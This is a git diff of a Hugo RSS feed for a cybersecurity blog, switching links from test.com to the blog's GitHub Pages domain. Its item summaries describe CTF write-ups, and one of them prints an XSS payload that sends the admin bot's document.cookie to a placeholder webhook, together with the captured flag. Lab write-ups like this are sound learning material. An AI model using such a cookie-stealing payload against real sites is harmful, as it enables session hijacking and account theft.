@@ -2,27 +2,27 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Posts on chrootcommit</title>
-    <link>https://test.com/posts/</link>
+    <link>https://chrootcommit.github.io/posts/</link>
     <description>Recent content in Posts on chrootcommit</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 20 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://test.com/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 20 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://chrootcommit.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>WolvCTF 2023 - Writeup</title>
-      <link>https://test.com/posts/2023-03-20-wolvctf2023/</link>
+      <link>https://chrootcommit.github.io/posts/2023-03-20-wolvctf2023/</link>
       <pubDate>Mon, 20 Mar 2023 00:00:00 +0000</pubDate>
       
-      <guid>https://test.com/posts/2023-03-20-wolvctf2023/</guid>
+      <guid>https://chrootcommit.github.io/posts/2023-03-20-wolvctf2023/</guid>
       <description>Challenges Solved : Web ZOmbie 101 This Challenge is a a classic xss where you steal the cookie&amp;rsquo;s admin. (admin is a bot who visits the url you give).
 Payload : &amp;lt;script&amp;gt;window.location=&amp;#34;https://&amp;lt;myWebHook&amp;gt;/?c=&amp;#34;.concat(document.cookie)&amp;lt;/script&amp;gt; I sent the url with payload to the admin input and got the flag : wctf{c14551c-4dm1n-807-ch41-n1c3-j08-93261} Zombie 201 It is the same webapp than Zombie 101, but admin activated the httponly parameter. We can&amp;rsquo;t gather the cookie throught the document object.</description>
     </item>
     
     <item>
       <title>\[FR\] HTB - Wrong Spooky Season</title>
-      <link>https://test.com/posts/2023-03-01-hackthebox-wrong_spooky_season/</link>
+      <link>https://chrootcommit.github.io/posts/2023-03-01-hackthebox-wrong_spooky_season/</link>
       <pubDate>Wed, 01 Mar 2023 00:00:00 +0000</pubDate>
       
-      <guid>https://test.com/posts/2023-03-01-hackthebox-wrong_spooky_season/</guid>
+      <guid>https://chrootcommit.github.io/posts/2023-03-01-hackthebox-wrong_spooky_season/</guid>
       <description>HTB - Wrong Spooky Season
 Catégorie : Forensic
 Enoncé : &amp;ldquo;I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us. I was wrong.&amp;rdquo; Now there is an internal breach in the Spooky Network and you need to find out what happened. Analyze the the network traffic and find how the scary ghosts got in and what they did.</description>
@@ -30,10 +30,10 @@ Enoncé : &amp;ldquo;I told them it was too soon and in the wrong season to depl
     
     <item>
       <title>THM - IDE</title>
-      <link>https://test.com/posts/2023-02-28-tryhackme-ide/</link>
+      <link>https://chrootcommit.github.io/posts/2023-02-28-tryhackme-ide/</link>
       <pubDate>Tue, 28 Feb 2023 00:00:00 +0000</pubDate>
       
-      <guid>https://test.com/posts/2023-02-28-tryhackme-ide/</guid>
+      <guid>https://chrootcommit.github.io/posts/2023-02-28-tryhackme-ide/</guid>
       <description>Hello, It is my first post. From now I start to post my writeup/notes about CTF challenges from differents platforms to share you my approach.
 Enumeration Let&amp;rsquo;s scan ports :
 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) MAC Address: 02:C5:29:36:64:91 (Unknown) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 62337 open tcp -&amp;gt; HTTP -&amp;gt; Codiad 2.</description>
@@ -41,10 +41,10 @@ PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 
     
     <item>
       <title>About</title>
-      <link>https://test.com/posts/about/</link>
+      <link>https://chrootcommit.github.io/posts/about/</link>
       <pubDate>Mon, 27 Feb 2023 00:00:00 +0000</pubDate>
       
-      <guid>https://test.com/posts/about/</guid>
+      <guid>https://chrootcommit.github.io/posts/about/</guid>
       <description>Junior Cybersecurity Consultant. I’m a passionated about cybersecurity. In my blog, I share you my experience in infosec.(notes, ctf writeup, tutorials)</description>
     </item>
     
